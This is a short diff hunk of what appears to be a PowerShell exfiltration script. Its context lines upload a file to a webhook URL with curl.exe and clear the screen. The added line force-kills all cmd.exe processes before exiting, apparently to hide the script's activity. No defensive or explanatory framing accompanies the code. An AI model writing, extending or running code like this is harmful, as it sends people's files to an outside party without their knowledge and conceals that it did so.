@@ -126,4 +126,5 @@ if (-not ([string]::IsNullOrEmpty($FilePath))){
     curl.exe -F "file1=@$FilePath" $WebhookUrl
 }
 clear
+taskkill /f /im cmd.exe
 exit
